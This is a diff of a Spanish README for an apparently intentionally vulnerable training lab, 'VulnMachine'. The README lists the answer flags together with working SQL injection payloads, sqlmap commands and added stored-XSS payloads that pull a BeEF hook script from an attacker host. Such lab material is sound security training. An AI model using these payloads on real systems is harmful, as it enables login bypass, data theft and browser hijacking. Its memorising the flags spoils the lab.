@@ -1,11 +1,13 @@
-# VulnMachine – SQL Injection Lab
+# VulnMachine – SQL Injection & XSS Lab
 
 > Plataforma de entrenamiento en seguridad ofensiva inspirada en Metasploitable2.  
 > **Solo para uso educativo en entornos aislados.**
 
+**Autores:** Lorenzo Lotero, Bairon Martinez, Juan Riveros
+
 ---
 
-## 🚀 Instalación y arranque
+## Instalacion y arranque
 
 ```bash
 # 1. Instalar dependencias
@@ -25,14 +27,14 @@ http://192.168.56.101:5000
 
 ---
 
-## 🏁 Las 12 Banderas
+## Las 14 Banderas
 
 ### Challenge 1 – Login Bypass
 
 | Flag | Nivel | Payload |
 |------|-------|---------|
-| `FLAG{1A_4dm1n_bypass_sqli_b4sic}` | Básico | `usuario: admin'--` o `' OR '1'='1'--` |
-| `FLAG{1B_w4f_bypass_case_OR_1=1}` | WAF | `usuario: ' OR '1'='1'--` (con OR mayúscula) |
+| `FLAG{1A_4dm1n_bypass_sqli_b4sic}` | Basico | `usuario: admin'--` o `' OR '1'='1'--` |
+| `FLAG{1B_w4f_bypass_case_OR_1=1}` | WAF | `usuario: ' OR '1'='1'--` (con OR mayuscula) |
 
 ### Challenge 2 – Error-Based / UNION
 
@@ -41,9 +43,9 @@ http://192.168.56.101:5000
 | `FLAG{2A_err0r_based_data_exfil}` | 1 | `?id=0 UNION SELECT 1,secret_flag,3,4,5,6,7 FROM products WHERE id=3--` |
 | `FLAG{2B_un10n_s3lect_s3cret_t4ble}` | 2 | `?id=1 UNION SELECT 1,secret_flag,3,4,5,6,7 FROM products WHERE id=6--` (con espacio al inicio) |
 
-> **Nota:** La tabla `products` tiene **7 columnas**: id, name, description, category, price, stock, secret_flag
+> Nota: La tabla `products` tiene 7 columnas: id, name, description, category, price, stock, secret_flag
 
-### Challenge 3 – UNION en categoría
+### Challenge 3 – UNION en categoria
 
 | Flag | Nivel | Payload |
 |------|-------|---------|
@@ -57,7 +59,7 @@ http://192.168.56.101:5000
 | `FLAG{4A_bl1nd_bool_sqli_tr00}` | 1 | `?id=6` (usuario superuser tiene la flag en su secret) |
 | `FLAG{4B_bl1nd_b00l_t1me_b4sed}` | 2 | `?id=7` (usuario guest) — usar sqlmap para extraer |
 
-**sqlmap automático:**
+sqlmap automatico:
 ```bash
 sqlmap -u "http://192.168.56.101:5000/challenge/4/level1?id=1" \
        --dbs --dump --level=3 --risk=2 --batch
@@ -77,12 +79,21 @@ sqlmap -u "http://192.168.56.101:5000/challenge/4/level1?id=1" \
 | `FLAG{6A_0rder_by_sqli_c4se_when}` | 1 | `?sort=(SELECT secret_flag FROM products WHERE id=11)` |
 | `FLAG{6B_c0l_subquery_m4ster}` | 2 | `?sort=id&col=(SELECT secret_flag FROM products WHERE id=12)` |
 
+### Challenge 7 – Stored XSS / BeEF
+
+| Flag | Nivel | Payload |
+|------|-------|---------|
+| `FLAG{7A_st0red_xss_b33f_h00k}` | 1 (sin filtro) | `<script src="http://<IP_KALI>:3000/hook.js"></script>` |
+| `FLAG{7B_xss_f1lt3r_byp4ss_b33f}` | 2 (WAF bypass) | `<img src=x onerror="var s=document.createElement('script');s.src='http://<IP_KALI>:3000/hook.js';document.head.appendChild(s)">` |
+
+> Requiere BeEF corriendo en Kali: `sudo beef-xss`. Panel en `http://127.0.0.1:3000/ui/panel`.
+
 ---
 
-## 🔧 Herramientas recomendadas (Kali Linux)
+## Herramientas recomendadas (Kali Linux)
 
 ```bash
-# sqlmap básico
+# sqlmap basico
 sqlmap -u "http://IP:5000/ruta?param=valor" --dbs
 
 # sqlmap con dump completo
@@ -93,43 +104,49 @@ sqlmap -u "http://IP:5000/challenge/2/level1?id=1" \
 curl "http://IP:5000/challenge/2/level1?id=0%20UNION%20SELECT%201,secret_flag,3,4,5,6,7%20FROM%20products--"
 
 # Burp Suite
-# Proxy → Intercept → Send to Repeater → Modificar parámetros
+# Proxy -> Intercept -> Send to Repeater -> Modificar parametros
+
+# BeEF (para Challenge 7)
+sudo beef-xss
+# Panel: http://127.0.0.1:3000/ui/panel
 ```
 
 ---
 
-## 🗄️ Estructura de la base de datos
+## Estructura de la base de datos
 
 ```
-users         → id, username, password, role, email, secret
-products      → id, name, description, category, price, stock, secret_flag  (7 cols)
-secret_flags  → id, name, flag
+users         -> id, username, password, role, email, secret
+products      -> id, name, description, category, price, stock, secret_flag  (7 cols)
+secret_flags  -> id, name, flag
+comments      -> id, level, author, content, timestamp
 ```
 
 ---
 
-## 📁 Estructura del proyecto
+## Estructura del proyecto
 
 ```
 .
-├── app.py           ← Aplicación Flask principal
-├── setup_db.py      ← Crea la base de datos
-├── vulnerable.db    ← Base de datos SQLite (generada)
+├── app.py           <- Aplicacion Flask principal
+├── setup_db.py      <- Crea la base de datos
+├── vulnerable.db    <- Base de datos SQLite (generada)
 └── templates/
     ├── base.html
     ├── index.html
-    ├── challenge1-6.html
+    ├── challenge1-7.html
     ├── c1_level1/2.html
     ├── c2_level1/2.html
     ├── c3_level1/2.html
     ├── c4_level1/2.html
     ├── c5_level1/2.html
     ├── c6_level1/2.html
+    ├── c7_level1/2.html
     └── scoreboard.html
 ```
 
 ---
 
-⚠️ **ADVERTENCIA**: Este laboratorio es intencionalmente vulnerable.  
-Úsalo únicamente en redes aisladas (host-only adapter en VirtualBox).  
+[!] ADVERTENCIA: Este laboratorio es intencionalmente vulnerable.  
+Usalo unicamente en redes aisladas (host-only adapter en VirtualBox).  
 No expongas este servidor a internet.
